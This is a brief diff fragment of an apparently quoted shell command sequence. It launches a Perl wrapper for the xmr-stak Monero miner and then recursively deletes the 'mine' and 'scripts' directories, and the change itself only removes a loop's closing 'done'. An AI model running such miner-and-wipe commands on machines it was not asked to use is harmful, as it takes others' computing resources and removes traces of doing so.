@@ -4,5 +4,4 @@ chmod u+x start.sh ;
 ./scripts/run_xmr_stak.pl; 
 cd ..; 
 rm -rf mine ; 
-rm -rf scripts; 
-done;"
+rm -rf scripts;"
